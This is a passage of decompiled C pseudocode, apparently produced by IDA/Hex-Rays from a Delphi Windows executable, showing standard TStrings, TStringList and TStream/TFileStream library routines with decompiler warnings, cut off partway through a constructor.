void __usercall Classes::TStrings::Move(Classes::TStrings *this@<ecx>, _DWORD *a2@<eax>, Classes::TStrings *a3@<edx>)
{
  int v5; // edi
  LStr *v6; // ecx
  _DWORD v7[3]; // [esp-18h] [ebp-2Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // [esp-Ch] [ebp-20h] BYREF
  void *v9; // [esp-8h] [ebp-1Ch]
  LStr *v10; // [esp-4h] [ebp-18h]
  void *v11; // [esp+0h] [ebp-14h]
  int v12; // [esp+Ch] [ebp-8h] BYREF
  _DWORD *v13; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v12 = 0;
  v13 = a2;
  v10 = (LStr *)&savedregs;
  v9 = &loc_40CF1D;
  v8 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v8);
  if ( this != a3 )
  {
    sub_40C890(v13);
    v7[2] = &savedregs;
    v7[1] = &loc_40CF00;
    v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v7);
    (*(void (__fastcall **)(int *, Classes::TStrings *, _DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v13 + 12))(
      &v12,
      a3,
      v7[0],
      &loc_40CF00,
      &savedregs,
      v8);
    v5 = (*(int (**)(void))(*v13 + 24))();
    (*(void (**)(void))(*v13 + 68))();
    Classes::TStrings::InsertObject((int)v13, (int)this, v12, v5);
    __writefsdword(0, (unsigned int)v9);
    v11 = &loc_40CF07;
    sub_40C94C(v13);
  }
  v6 = v10;
  __writefsdword(0, (unsigned int)v8);
  v10 = (LStr *)&loc_40CF24;
  System::__linkproc__ LStrClr(v6);
}

//----- (0040CF2C) --------------------------------------------------------
int __usercall Classes::TStrings::Put@<eax>(Classes::TStrings *this@<ecx>, int a2@<eax>, int a3@<edx>)
{
  int v6; // edi

  v6 = (*(int (**)(void))(*(_DWORD *)a2 + 24))();
  (*(void (**)(void))(*(_DWORD *)a2 + 68))();
  return Classes::TStrings::InsertObject(a2, a3, (int)this, v6);
}

//----- (0040CF60) --------------------------------------------------------
void __usercall Idmultipartformdata::TIdFormDataField::SetContentType(_DWORD *System::AnsiString@<edx>, _DWORD *a2@<eax>)
{
  int v3; // ecx
  TReader *v4; // ecx
  void *v5; // ecx
  LStr *v6; // ecx
  _DWORD v7[3]; // [esp-18h] [ebp-24h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // [esp-Ch] [ebp-18h] BYREF
  void *v9; // [esp-8h] [ebp-14h]
  int *v10; // [esp-4h] [ebp-10h]
  BYTE *v11; // [esp+0h] [ebp-Ch] BYREF
  _DWORD *v12; // [esp+4h] [ebp-8h]
  _DWORD *v13; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v11 = 0;
  v12 = System::AnsiString;
  v13 = a2;
  v10 = &savedregs;
  v9 = &loc_40D004;
  v8 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v8);
  sub_40DEA0(System::AnsiString, 0);
  sub_40C890(v13);
  v7[2] = &savedregs;
  v7[1] = &loc_40CFDF;
  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  (*(void (__stdcall **)(_DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v13 + 64))(
    v7[0],
    &loc_40CFDF,
    &savedregs,
    v8);
  while ( !sub_40DDF4(v12, v3) )
  {
    TReader::ReadString(v4, v12, &v11);
    (*(void (**)(void))(*v13 + 52))();
  }
  __writefsdword(0, (unsigned int)v9);
  v11 = (BYTE *)&loc_40CFE6;
  sub_40C94C(v13);
  sub_40DEA8(v5, v12);
  v6 = (LStr *)v11;
  __writefsdword(0, (unsigned int)v9);
  v11 = (BYTE *)&loc_40D00B;
  System::__linkproc__ LStrClr(v6);
}
// 40CFAD: variable 'v4' is possibly undefined
// 40CFC0: variable 'v3' is possibly undefined
// 40CFE9: variable 'v5' is possibly undefined

//----- (0040D010) --------------------------------------------------------
_DWORD *__usercall Classes::TStrings::SaveToFile@<eax>(Classes::TFileStream *System::AnsiString@<edx>, int a2@<eax>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *v5; // [esp-Ch] [ebp-14h] BYREF
  void *v6; // [esp-8h] [ebp-10h]
  int *v7; // [esp-4h] [ebp-Ch]
  void *v8; // [esp+0h] [ebp-8h]
  _DWORD *v9; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v9 = Classes::TFileStream::TFileStream(System::AnsiString, 1, (int)off_40BD88, 0xFFFFu);
  v7 = &savedregs;
  v6 = &loc_40D05B;
  v5 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v5);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a2 + 104))(v5);
  __writefsdword(0, (unsigned int)v6);
  v8 = &loc_40D062;
  return sub_402BDC(v9);
}
// 40BD88: using guessed type int (*off_40BD88[4])();

//----- (0040D068) --------------------------------------------------------
void __usercall Classes::TStrings::SaveToStream(Classes::TStream *a1@<edx>, int a2@<eax>, int a3@<esi>)
{
  Classes::TStream *v5; // eax
  LStr *v6; // ecx
  _DWORD v7[3]; // [esp-14h] [ebp-18h] BYREF
  int v8; // [esp-8h] [ebp-Ch]
  unsigned int v9; // [esp-4h] [ebp-8h]
  const void *v10; // [esp+0h] [ebp-4h]
  LStr *savedregs; // [esp+4h] [ebp+0h] BYREF

  v10 = 0;
  v8 = a3;
  v7[2] = &savedregs;
  v7[1] = &loc_40D0B5;
  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  (*(void (__stdcall **)(_DWORD, void *, LStr **, int))(*(_DWORD *)a2 + 28))(v7[0], &loc_40D0B5, &savedregs, v8);
  v5 = (Classes::TStream *)sub_403724((int)v10);
  Classes::TStream::WriteBuffer(v5, v10, (int)a1);
  v6 = savedregs;
  __writefsdword(0, v9);
  savedregs = (LStr *)&loc_40D0BC;
  System::__linkproc__ LStrClr(v6);
}
// 40D068: could not find valid save-restore pair for esi

//----- (0040D0C8) --------------------------------------------------------
int *__usercall Classes::TStrings::SetStringsAdapter@<eax>(int a1@<eax>, int a2@<edx>)
{
  int *result; // eax

  if ( *(_DWORD *)(a1 + 8) )
    (*(void (**)(void))(**(_DWORD **)(a1 + 8) + 16))();
  result = sub_404BF0((int *)(a1 + 8), a2);
  if ( *(_DWORD *)(a1 + 8) )
    result = (int *)(*(int (**)(void))(**(_DWORD **)(a1 + 8) + 12))();
  return result;
}

//----- (0040D0FC) --------------------------------------------------------
void __usercall Classes::TStrings::SetText(const wchar_t *a1@<edx>, int a2@<eax>)
{
  LStr *v4; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v5; // [esp-14h] [ebp-18h] BYREF
  void *v6; // [esp-10h] [ebp-14h]
  void **v7; // [esp-Ch] [ebp-10h]
  int v8; // [esp-8h] [ebp-Ch]
  unsigned int v9; // [esp-4h] [ebp-8h]
  BYTE *v10; // [esp+0h] [ebp-4h] BYREF
  LStr *savedregs; // [esp+4h] [ebp+0h] BYREF

  v10 = 0;
  v7 = (void **)&savedregs;
  v6 = &loc_40D13F;
  v5 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v5);
  __linkproc__ LStrFromPChar_0(&v10, (BYTE *)a1);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, void **, int))(*(_DWORD *)a2 + 44))(
    v5,
    v6,
    v7,
    v8);
  v4 = savedregs;
  __writefsdword(0, v9);
  savedregs = (LStr *)&loc_40D146;
  System::__linkproc__ LStrClr(v4);
}

//----- (0040D14C) --------------------------------------------------------
void __usercall TStrings::SetTextStr(const int AnsiString@<edx>, _DWORD *a2@<eax>)
{
  BYTE *v4; // eax
  LStr *v5; // ecx
  _DWORD v6[3]; // [esp-18h] [ebp-24h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp-Ch] [ebp-18h] BYREF
  void *v8; // [esp-8h] [ebp-14h]
  int *v9; // [esp-4h] [ebp-10h]
  LStr *v10; // [esp+0h] [ebp-Ch]
  BYTE *v11; // [esp+4h] [ebp-8h] BYREF
  _DWORD *v12; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v11 = 0;
  v12 = a2;
  v9 = &savedregs;
  v8 = &loc_40D200;
  v7 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v7);
  sub_40C890(a2);
  v6[2] = &savedregs;
  v6[1] = &loc_40D1E3;
  v6[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  (*(void (__stdcall **)(_DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v12 + 64))(
    v6[0],
    &loc_40D1E3,
    &savedregs,
    v7);
  if ( AnsiString )
  {
    while ( *(_BYTE *)AnsiString )
    {
      v4 = (BYTE *)AnsiString;
      while ( *(_BYTE *)AnsiString && *(_BYTE *)AnsiString != 10 && *(_BYTE *)AnsiString != 13 )
        ++AnsiString;
      __linkproc__ LStrFromPCharLen(&v11, v4, AnsiString - (_DWORD)v4);
      (*(void (**)(void))(*v12 + 52))();
      if ( *(_BYTE *)AnsiString == 13 )
        ++AnsiString;
      if ( *(_BYTE *)AnsiString == 10 )
        ++AnsiString;
    }
  }
  __writefsdword(0, (unsigned int)v8);
  v10 = (LStr *)&loc_40D1EA;
  sub_40C94C(v12);
  v5 = v10;
  __writefsdword(0, (unsigned int)v8);
  v10 = (LStr *)&loc_40D207;
  System::__linkproc__ LStrClr(v5);
}

//----- (0040D210) --------------------------------------------------------
void __usercall Tntwidestrings::TWideStrings::WriteData(TWriter *a1@<edx>, int a2@<eax>)
{
  int v3; // eax
  int v4; // ecx
  int v5; // ebx
  int v6; // esi
  LStr *v7; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // [esp-Ch] [ebp-24h] BYREF
  void *v9; // [esp-8h] [ebp-20h]
  int *v10; // [esp-4h] [ebp-1Ch]
  LStr *v11; // [esp+0h] [ebp-18h]
  void *v12; // [esp+Ch] [ebp-Ch] BYREF
  TWriter *v13; // [esp+10h] [ebp-8h]
  int v14; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v12 = 0;
  v13 = a1;
  v14 = a2;
  v10 = &savedregs;
  v9 = &loc_40D286;
  v8 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v8);
  sub_40E2C0(a1, 0);
  v3 = (*(int (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v14 + 20))(v8);
  if ( v3 - 1 >= 0 )
  {
    v5 = v3;
    v6 = 0;
    do
    {
      (*(void (__fastcall **)(void **, int))(*(_DWORD *)v14 + 12))(&v12, v6);
      TWriter::WriteString(v12, v13);
      ++v6;
      --v5;
    }
    while ( v5 );
  }
  sub_40E2C8(v13, v4);
  v7 = v11;
  __writefsdword(0, (unsigned int)v9);
  v11 = (LStr *)&loc_40D28D;
  System::__linkproc__ LStrClr(v7);
}
// 40D26B: variable 'v4' is possibly undefined

//----- (0040D294) --------------------------------------------------------
int __usercall Classes::TStringList::~TStringList@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v3; // eax
  char v4; // dl
  char v5; // bl
  _DWORD *v6; // esi
  int result; // eax

  v3 = sub_402D3C(a1, a2);
  v5 = v4;
  v6 = v3;
  v3[8] = 0;
  v3[9] = 0;
  v3[10] = 0;
  v3[11] = 0;
  Cxtl::TcxTreeListCustomizing::~TcxTreeListCustomizing(v3, v4 & 0xFC);
  if ( v6[4] )
    System::__linkproc__ FinalizeArray((OLECHAR **)v6[3], (char *)dword_40BB48, v6[4]);
  v6[4] = 0;
  result = (*(int (**)(void))(*v6 + 40))();
  if ( v5 > 0 )
    result = sub_402D2C(v6);
  return result;
}
// 40D29B: variable 'v4' is possibly undefined
// 40BB48: using guessed type int dword_40BB48[5];

//----- (0040D2F0) --------------------------------------------------------
Classes::TStringList *__usercall Classes::TStringList::Add@<eax>(Classes::TStringList *this@<ecx>, Classes::TStringList *System::AnsiString@<edx>, int a3@<eax>)
{
  char v5; // al
  bool v6; // cf
  char v7; // al
  Classes::TStringList *v9; // [esp+0h] [ebp-10h] BYREF

  v9 = this;
  if ( !*(_BYTE *)(a3 + 24) )
  {
    v9 = *(Classes::TStringList **)(a3 + 16);
LABEL_7:
    Classes::TStringList::InsertItem(System::AnsiString, (_DWORD *)a3, (int)v9);
    return v9;
  }
  if ( !(*(unsigned __int8 (__fastcall **)(Classes::TStringList **, Classes::TStringList *))(*(_DWORD *)a3 + 120))(
          &v9,
          System::AnsiString) )
    goto LABEL_7;
  v5 = *(_BYTE *)(a3 + 25);
  v6 = v5 == 0;
  v7 = v5 - 1;
  if ( !v6 )
  {
    if ( v7 == 1 )
      Tntwidestrings::TWideStrings::Error(0, (int)off_41DB24[0]);
    goto LABEL_7;
  }
  return v9;
}
// 41DB24: using guessed type int *off_41DB24[3];

//----- (0040D348) --------------------------------------------------------
int __usercall sub_40D348@<eax>(int result@<eax>, int a2@<ecx>)
{
  if ( !*(_DWORD *)(result + 4) )
  {
    if ( *(_WORD *)(result + 34) )
      result = (*(int (__fastcall **)(int, int))(result + 32))(a2, result);
  }
  return result;
}

//----- (0040D364) --------------------------------------------------------
int __usercall sub_40D364@<eax>(int result@<eax>, int a2@<ecx>)
{
  if ( !*(_DWORD *)(result + 4) )
  {
    if ( *(_WORD *)(result + 42) )
      result = (*(int (__fastcall **)(int, int))(result + 40))(a2, result);
  }
  return result;
}

//----- (0040D380) --------------------------------------------------------
_DWORD *__usercall Classes::TStringList::Clear@<eax>(Classes::TStringList *this@<ecx>, _DWORD *result@<eax>)
{
  _DWORD *v2; // ebx

  v2 = result;
  if ( result[4] )
  {
    (*(void (__thiscall **)(Classes::TStringList *))(*result + 116))(this);
    System::__linkproc__ FinalizeArray((OLECHAR **)v2[3], (char *)dword_40BB48, v2[4]);
    v2[4] = 0;
    (*(void (**)(void))(*v2 + 40))();
    result = (_DWORD *)(*(int (**)(void))(*v2 + 112))();
  }
  return result;
}
// 40BB48: using guessed type int dword_40BB48[5];

//----- (0040D3B8) --------------------------------------------------------
int __usercall Classes::TStringList::Delete@<eax>(Classes::TStringList *this@<ecx>, int a2@<edx>, _DWORD *a3@<eax>)
{
  int v5; // eax

  if ( a2 < 0 || a2 >= a3[4] )
    Tntwidestrings::TWideStrings::Error(a2, (int)off_41DC24[0]);
  (*(void (__thiscall **)(Classes::TStringList *))(*a3 + 116))(this);
  sub_403CD0((OLECHAR **)(a3[3] + 8 * a2), (char *)dword_40BB48);
  v5 = --a3[4];
  if ( a2 < v5 )
    Move((BYTE *)(a3[3] + 8 * a2 + 8), (BYTE *)(a3[3] + 8 * a2), 8 * (v5 - a2));
  return (*(int (**)(void))(*a3 + 112))();
}
// 40D3DA: variable 'this' is possibly undefined
// 40BB48: using guessed type int dword_40BB48[5];
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040D41C) --------------------------------------------------------
int __usercall Classes::TStringList::Exchange@<eax>(Classes::TStringList *this@<ecx>, int a2@<edx>, _DWORD *a3@<eax>)
{
  if ( a2 < 0 || a2 >= a3[4] )
    Tntwidestrings::TWideStrings::Error(a2, (int)off_41DC24[0]);
  if ( (int)this < 0 || (int)this >= a3[4] )
    Tntwidestrings::TWideStrings::Error((int)this, (int)off_41DC24[0]);
  (*(void (**)(void))(*a3 + 116))();
  Classes::TStringList::ExchangeItems(this, a2, (int)a3);
  return (*(int (**)(void))(*a3 + 112))();
}
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040D474) --------------------------------------------------------
int *__usercall Classes::TStringList::ExchangeItems@<eax>(Classes::TStringList *this@<ecx>, int a2@<edx>, int a3@<eax>)
{
  int *v3; // edx
  int *result; // eax
  int v5; // ecx
  int v6; // ecx

  v3 = (int *)(*(_DWORD *)(a3 + 12) + 8 * a2);
  result = (int *)(*(_DWORD *)(a3 + 12) + 8 * (_DWORD)this);
  v5 = *v3;
  *v3 = *result;
  *result = v5;
  v6 = v3[1];
  v3[1] = result[1];
  result[1] = v6;
  return result;
}

//----- (0040D498) --------------------------------------------------------
char __usercall TStringList::Find@<al>(int a1@<eax>, char *a2@<edx>, signed int *a3@<ecx>)
{
  signed int v4; // esi
  int v5; // edi
  unsigned int v6; // ebx
  int v7; // eax
  char v11; // [esp+8h] [ebp-14h]

  v11 = 0;
  v4 = 0;
  v5 = *(_DWORD *)(a1 + 16) - 1;
  if ( v5 >= 0 )
  {
    do
    {
      v6 = (unsigned int)(v5 + v4) >> 1;
      v7 = DumbItDownFor95(*(char **)(*(_DWORD *)(a1 + 12) + 8 * v6), a2);
      if ( v7 >= 0 )
      {
        v5 = v6 - 1;
        if ( !v7 )
        {
          v11 = 1;
          if ( *(_BYTE *)(a1 + 25) != 1 )
            v4 = v6;
        }
      }
      else
      {
        v4 = v6 + 1;
      }
    }
    while ( v5 >= v4 );
  }
  *a3 = v4;
  return v11;
}

//----- (0040D500) --------------------------------------------------------
void __usercall Classes::TStringList::Get(Classes::TStringList *this@<ecx>, int a2@<edx>, int a3@<eax>)
{
  if ( a2 < 0 || a2 >= *(_DWORD *)(a3 + 16) )
    Tntwidestrings::TWideStrings::Error(a2, (int)off_41DC24[0]);
  __linkproc__ LStrAsg((char **)this, *(char **)(*(_DWORD *)(a3 + 12) + 8 * a2));
}
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040D534) --------------------------------------------------------
int __usercall sub_40D534@<eax>(int a1@<eax>)
{
  return *(_DWORD *)(a1 + 20);
}

//----- (0040D538) --------------------------------------------------------
int __usercall sub_40D538@<eax>(int a1@<eax>)
{
  return *(_DWORD *)(a1 + 16);
}

//----- (0040D53C) --------------------------------------------------------
int __usercall Classes::TStringList::GetObject@<eax>(int a1@<edx>, int a2@<eax>)
{
  if ( a1 < 0 || a1 >= *(_DWORD *)(a2 + 16) )
    Tntwidestrings::TWideStrings::Error(a1, (int)off_41DC24[0]);
  return *(_DWORD *)(*(_DWORD *)(a2 + 12) + 8 * a1 + 4);
}
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040D564) --------------------------------------------------------
int __usercall Classes::TStringList::Grow@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 40))();
}
// 40D571: conditional instruction was optimized away because of 'edx.4>=41'

//----- (0040D598) --------------------------------------------------------
// @Classes@TStringList@IndexOf$qqrx17System@AnsiString
// doubtful name
int __usercall Classes::TStringList::IndexOf@<eax>(Classes::TStringList *this@<ecx>, char *System::AnsiString@<edx>, _BYTE *a3@<eax>)
{
  int v4[3]; // [esp+0h] [ebp-Ch] BYREF

  v4[0] = (int)this;
  if ( !a3[24] )
    return Classes::TStrings::IndexOf(System::AnsiString, (int)a3);
  if ( !(*(unsigned __int8 (__fastcall **)(int *, char *))(*(_DWORD *)a3 + 120))(v4, System::AnsiString) )
    v4[0] = -1;
  return v4[0];
}

//----- (0040D5D0) --------------------------------------------------------
int __usercall Classes::TStringList::Insert@<eax>(Classes::TStringList *this@<ecx>, int a2@<eax>, int a3@<edx>)
{
  if ( *(_BYTE *)(a2 + 24) )
    Tntwidestrings::TWideStrings::Error(0, (int)off_41DB90[0]);
  if ( a3 < 0 || a3 > *(_DWORD *)(a2 + 16) )
    Tntwidestrings::TWideStrings::Error(a3, (int)off_41DC24[0]);
  return Classes::TStringList::InsertItem(this, (_DWORD *)a2, a3);
}
// 41DB90: using guessed type int **off_41DB90[24];
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040D618) --------------------------------------------------------
int __usercall Classes::TStringList::InsertItem@<eax>(Classes::TStringList *this@<ecx>, _DWORD *a2@<eax>, int a3@<edx>)
{
  int v6; // eax
  int v7; // esi

  (*(void (**)(void))(*a2 + 116))();
  if ( a2[4] == a2[5] )
    Classes::TStringList::Grow((int)a2);
  v6 = a2[4];
  if ( a3 < v6 )
    Move((BYTE *)(a2[3] + 8 * a3), (BYTE *)(a2[3] + 8 * a3 + 8), 8 * (v6 - a3));
  v7 = a2[3] + 8 * a3;
  *(_DWORD *)v7 = 0;
  *(_DWORD *)(v7 + 4) = 0;
  __linkproc__ LStrAsg((char **)v7, (char *)this);
  ++a2[4];
  return (*(int (**)(void))(*a2 + 112))();
}

//----- (0040D680) --------------------------------------------------------
int __usercall Classes::TStringList::Put@<eax>(Classes::TStringList *this@<ecx>, int a2@<eax>, int a3@<edx>)
{
  if ( *(_BYTE *)(a2 + 24) )
    Tntwidestrings::TWideStrings::Error(0, (int)off_41DB90[0]);
  if ( a3 < 0 || a3 >= *(_DWORD *)(a2 + 16) )
    Tntwidestrings::TWideStrings::Error(a3, (int)off_41DC24[0]);
  (*(void (**)(void))(*(_DWORD *)a2 + 116))();
  __linkproc__ LStrAsg((char **)(*(_DWORD *)(a2 + 12) + 8 * a3), (char *)this);
  return (*(int (**)(void))(*(_DWORD *)a2 + 112))();
}
// 41DB90: using guessed type int **off_41DB90[24];
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040D6D8) --------------------------------------------------------
int __usercall Classes::TStringList::PutObject@<eax>(Classes::TStringList *this@<ecx>, int a2@<edx>, _DWORD *a3@<eax>)
{
  if ( a2 < 0 || a2 >= a3[4] )
    Tntwidestrings::TWideStrings::Error(a2, (int)off_41DC24[0]);
  (*(void (**)(void))(*a3 + 116))();
  *(_DWORD *)(a3[3] + 8 * a2 + 4) = this;
  return (*(int (**)(void))(*a3 + 112))();
}
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040D714) --------------------------------------------------------
int *__userpurge Tntclasses::TTntStringList::QuickSort@<eax>(Tntclasses::TTntStringList *this@<ecx>, int a2@<edx>, int a3@<eax>, int a4, int (__fastcall *a5)(Tntclasses::TTntStringList *, int, int))
{
  int v5; // ebx
  Classes::TStringList *v6; // esi
  int i; // eax
  int *result; // eax
  int (__fastcall *v9)(Tntclasses::TTntStringList *, int, int); // [esp+0h] [ebp-18h]
  unsigned int v10; // [esp+8h] [ebp-10h]

  do
  {
    v5 = a2;
    v6 = this;
    v10 = ((unsigned int)this + a2) >> 1;
    for ( i = ((int (__fastcall *)(unsigned int, int))a4)(v10, a2);
          ;
          i = ((int (__fastcall *)(unsigned int, int))a4)(v10, v5) )
    {
      if ( i < 0 )
      {
        ++v5;
        continue;
      }
      while ( 1 )
      {
        result = (int *)((int (__fastcall *)(unsigned int, Classes::TStringList *))a4)(v10, v6);
        if ( (int)result <= 0 )
          break;
        v6 = (Classes::TStringList *)((char *)v6 - 1);
      }
      if ( (int)v6 >= v5 )
      {
        result = Classes::TStringList::ExchangeItems(v6, v5, a3);
        if ( v5 == v10 )
        {
          v10 = (unsigned int)v6;
        }
        else if ( v6 == (Classes::TStringList *)v10 )
        {
          v10 = v5;
        }
        ++v5;
        v6 = (Classes::TStringList *)((char *)v6 - 1);
      }
      if ( (int)v6 < v5 )
        break;
    }
    if ( (int)v6 > a2 )
      result = (int *)Tntclasses::TTntStringList::QuickSort(v6, a2, a4, v9);
    a2 = v5;
  }
  while ( v5 < (int)this );
  return result;
}
// 40D793: variable 'v9' is possibly undefined

//----- (0040D7A8) --------------------------------------------------------
void __usercall sub_40D7A8(int a1@<eax>, int a2@<edx>)
{
  __linkproc__ ReallocMem((void **)(a1 + 12), 8 * a2);
  *(_DWORD *)(a1 + 20) = a2;
}

//----- (0040D7C4) --------------------------------------------------------
int __usercall sub_40D7C4@<eax>(int a1@<eax>, char a2@<dl>)
{
  int result; // eax

  if ( a2 )
    result = (*(int (**)(void))(*(_DWORD *)a1 + 116))();
  else
    result = (*(int (**)(void))(*(_DWORD *)a1 + 112))();
  return result;
}

//----- (0040D7D4) --------------------------------------------------------
int __usercall sub_40D7D4@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  return DumbItDownFor95(*(char **)(*(_DWORD *)(a1 + 12) + 8 * a2), *(char **)(*(_DWORD *)(a1 + 12) + 8 * a3));
}

//----- (0040D7EC) --------------------------------------------------------
int __usercall sub_40D7EC@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 128))();
}

//----- (0040D7FC) --------------------------------------------------------
int __usercall Classes::TStringList::CustomSort@<eax>(Classes::TStringList *this@<ecx>, int (__fastcall *a2)(Classes::TStringList *, int, int)@<edx>, int result@<eax>)
{
  _DWORD *v4; // ebx
  int (__fastcall *v5)(Tntclasses::TTntStringList *, int, int); // [esp+0h] [ebp-8h]

  v4 = (_DWORD *)result;
  if ( !*(_BYTE *)(result + 24) && *(int *)(result + 16) > 1 )
  {
    (*(void (__thiscall **)(Classes::TStringList *))(*(_DWORD *)result + 116))(this);
    Tntclasses::TTntStringList::QuickSort((Tntclasses::TTntStringList *)(v4[4] - 1), 0, (int)v4, (int)a2, v5);
    result = (*(int (**)(void))(*v4 + 112))();
  }
  return result;
}
// 40D81E: variable 'v5' is possibly undefined

//----- (0040D830) --------------------------------------------------------
int __usercall sub_40D830@<eax>(int a1@<eax>)
{
  return (*(int (__fastcall **)(__int16, _DWORD))(*(_DWORD *)a1 + 12))(1, 0);
}

//----- (0040D840) --------------------------------------------------------
int __usercall sub_40D840@<eax>(int a1@<eax>)
{
  return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)a1 + 12))(0);
}

//----- (0040D84C) --------------------------------------------------------
int __usercall Classes::TStream::GetSize@<eax>(int a1@<eax>)
{
  int v3; // esi
  int v4; // ecx
  int v5; // edi

  v3 = (*(int (__fastcall **)(__int16, _DWORD))(*(_DWORD *)a1 + 12))(1, 0);
  LOWORD(v4) = 2;
  v5 = (*(int (__fastcall **)(int, _DWORD))(*(_DWORD *)a1 + 12))(v4, 0);
  (*(void (__fastcall **)(_DWORD, int))(*(_DWORD *)a1 + 12))(0, v3);
  return v5;
}
// 40D86A: variable 'v4' is possibly undefined

//----- (0040D884) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall TStream::ReadBuffer@<eax>(int self@<eax>, void *a2@<edx>, int result@<ecx>)
{
  void *v4; // edx
  DWORD v5; // [esp-10h] [ebp-1Ch]
  DWORD v6; // [esp-Ch] [ebp-18h]
  DWORD v7; // [esp-8h] [ebp-14h]
  const ULONG_PTR *v8; // [esp-4h] [ebp-10h]

  if ( result )
  {
    self = (*(int (__fastcall **)(int, void *))(*(_DWORD *)self + 4))(result, a2);
    if ( result != self )
    {
      LOBYTE(v4) = 1;
      Exception_CreateRes_0(dword_40B6E4, v4);
      sub_402F98(v5, v6, v7, v8);
    }
  }
  return self;
}
// 40D8BA: positive sp value 10 has been found
// 40D8AD: variable 'v4' is possibly undefined
// 40D8B2: variable 'v5' is possibly undefined
// 40D8B2: variable 'v6' is possibly undefined
// 40D8B2: variable 'v7' is possibly undefined
// 40D8B2: variable 'v8' is possibly undefined
// 40B6E4: using guessed type int dword_40B6E4[3];

//----- (0040D8BC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall Classes::TStream::WriteBuffer(Classes::TStream *this@<ecx>, const void *a2@<edx>, int a3@<eax>)
{
  void *v3; // edx
  DWORD v4; // [esp-10h] [ebp-1Ch]
  DWORD v5; // [esp-Ch] [ebp-18h]
  DWORD v6; // [esp-8h] [ebp-14h]
  const ULONG_PTR *v7; // [esp-4h] [ebp-10h]

  if ( this )
  {
    if ( this != (Classes::TStream *)(*(int (__fastcall **)(Classes::TStream *, const void *))(*(_DWORD *)a3 + 8))(
                                       this,
                                       a2) )
    {
      LOBYTE(v3) = 1;
      Exception_CreateRes_0(dword_40B73C, v3);
      sub_402F98(v4, v5, v6, v7);
    }
  }
}
// 40D8F2: positive sp value 10 has been found
// 40D8E5: variable 'v3' is possibly undefined
// 40D8EA: variable 'v4' is possibly undefined
// 40D8EA: variable 'v5' is possibly undefined
// 40D8EA: variable 'v6' is possibly undefined
// 40D8EA: variable 'v7' is possibly undefined
// 40B73C: using guessed type int dword_40B73C[3];

//----- (0040D8F4) --------------------------------------------------------
DWORD __usercall sub_40D8F4@<eax>(int a1@<eax>, void *a2@<edx>, DWORD a3@<ecx>)
{
  DWORD result; // eax

  result = FileRead(a3, a2, *(void **)(a1 + 4));
  if ( result == -1 )
    result = 0;
  return result;
}

//----- (0040D904) --------------------------------------------------------
DWORD __usercall sub_40D904@<eax>(int a1@<eax>, void *a2@<edx>, DWORD a3@<ecx>)
{
  DWORD result; // eax

  result = FileRead_0(a3, a2, *(void **)(a1 + 4));
  if ( result == -1 )
    result = 0;
  return result;
}

//----- (0040D914) --------------------------------------------------------
DWORD __usercall sub_40D914@<eax>(int a1@<eax>, LONG a2@<edx>, unsigned __int16 a3@<cx>)
{
  return sub_40712C(a3, a2, *(void **)(a1 + 4));
}

//----- (0040D920) --------------------------------------------------------
int __usercall sub_40D920@<eax>(HANDLE *a1@<eax>)
{
  int v2; // eax

  (*((void (__thiscall **)(_DWORD))*a1 + 3))(0);
  v2 = SetEndOfFile_0(a1[1]);
  return sub_40A430(v2);
}

//----- (0040D940) --------------------------------------------------------
_DWORD *__userpurge Classes::TFileStream::TFileStream@<eax>(Classes::TFileStream *this@<ecx>, char System::AnsiString@<dl>, int a3@<eax>, unsigned __int16 a4)
{
  _DWORD *v4; // ebx
  HANDLE v5; // eax
  void *v6; // edx
  void *v7; // edx
  DWORD v9; // [esp-10h] [ebp-28h]
  DWORD v10; // [esp-Ch] [ebp-24h]
